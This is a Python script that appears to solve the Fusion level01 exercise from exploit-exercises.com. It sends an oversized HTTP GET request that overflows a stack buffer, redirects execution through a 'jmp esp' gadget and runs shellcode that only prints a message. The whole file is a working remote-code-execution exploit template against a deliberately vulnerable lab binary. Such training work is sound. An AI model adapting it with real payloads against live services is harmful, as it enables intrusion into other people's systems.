#!/usr/bin/env python
#
# http://exploit-exercises.com/fusion/level01
#
# (0) info from dmesg and gdb
# (1) ret comes from objdump -D level01 | grep "ff e4"
# (2) 'jmp esp' will jump into the header (trampoline)
#
# It's x86, brute-force anyone?

import socket
import struct

def main():
   s = socket.socket()
   s.connect((HOST, PORT))

   # Crafting a header (you're welcome for over-simplification)
   get = "GET "
   overflow = "\x41"*139
   proto = " HTTP/1.1"
   ret = 0x08049f4f # location of 'jmp esp'
   ret = struct.pack("<I", ret)
   trampoline = "\xeb\x21"
   header = get + overflow + ret + trampoline + proto
   
   # Crafting a payload
   payload = header + "\x90"*(1024-len(header)-len(SHELLCODE)) + SHELLCODE
   print "[DEBUG] payload (size = " + str(len(payload)) + "): " + payload.encode("hex") + "\n"
   
   s.send(payload)
   print s.recv(512)

   s.close()

if __name__ == "__main__":
   HOST = "192.168.1.5"
   PORT = 20001

   # prints out 'boom goes the dynamite!'
   SHELLCODE = "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x18" \
               "\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xe2\xff\xff\xff\x62\x6f" \
               "\x6f\x6d\x20\x67\x6f\x65\x73\x20\x74\x68\x65\x20\x64\x79\x6e\x61\x6d" \
               "\x69\x74\x65\x21\x0a"
   main()

